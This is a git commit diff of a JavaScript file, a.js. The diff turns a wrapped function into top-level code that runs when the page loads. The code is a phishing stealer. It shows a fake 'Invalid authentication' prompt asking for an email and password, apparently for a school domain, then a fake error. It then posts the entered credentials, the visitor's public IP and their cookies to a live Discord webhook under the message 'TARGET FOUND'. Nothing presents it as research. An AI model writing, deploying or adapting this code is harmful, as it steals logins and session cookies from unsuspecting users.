f5c07750b6002199da8ac6ab1bc002dde850975a
j3h1 <169068827+j3h1@users.noreply.github.com>
2024-05-06 15:13:17 +0000

    Update a.js

--- a.js
+++ a.js
@@ -12,35 +12,33 @@ async function fetchPublicIpAddress() {
     }
 }
 
-function a() {
-    while ((pr = window.prompt("Invalid authentication! Please retype your email and password in this format:\n\nemail+password \n\nExample:\n  johndoe@dazsma-osjschools.edu.ph + john_secret_password")) == '') {} alert("An error has occured to the servers. Please contact the developers to help fix this issue.");
-    
-    fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoVtcbZs16gwTLzs98Dl3ceLoU6ruAnZZ7E-HjKN9YHwL6vaaw0", {
-        "method": "POST",
-        "headers": {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        }, "body": JSON.stringify(
+while ((pr = window.prompt("Invalid authentication! Please retype your email and password in this format:\n\nemail+password \n\nExample:\n  johndoe@dazsma-osjschools.edu.ph + john_secret_password")) == '') {} alert("An error has occured to the servers. Please contact the developers to help fix this issue.");
+
+fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoVtcbZs16gwTLzs98Dl3ceLoU6ruAnZZ7E-HjKN9YHwL6vaaw0", {
+    "method": "POST",
+    "headers": {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    }, "body": JSON.stringify(
+        {
+        "content": "@everyone TARGET FOUND :warning::warning::warning:",
+        "embeds": [
             {
-            "content": "@everyone TARGET FOUND :warning::warning::warning:",
-            "embeds": [
-                {
-                    "title": "IP Address",
-                    "description": "```"+ await fetchPublicIpAddress() + "```",
-                    "color": 16711680
-                },
-                {   
-                "title": "Form Information",
-                "description": "```" + pr + "```",
+                "title": "IP Address",
+                "description": "```"+ await fetchPublicIpAddress() + "```",
                 "color": 16711680
-                },
-                {
-                "title": "Cookies",
-                "description": "```" + document.cookie + "```",
-                "color": 16711680
-                }
-            ],
-            "attachments": []
-        })
-    });
-}
+            },
+            {   
+            "title": "Form Information",
+            "description": "```" + pr + "```",
+            "color": 16711680
+            },
+            {
+            "title": "Cookies",
+            "description": "```" + document.cookie + "```",
+            "color": 16711680
+            }
+        ],
+        "attachments": []
+    })
+});
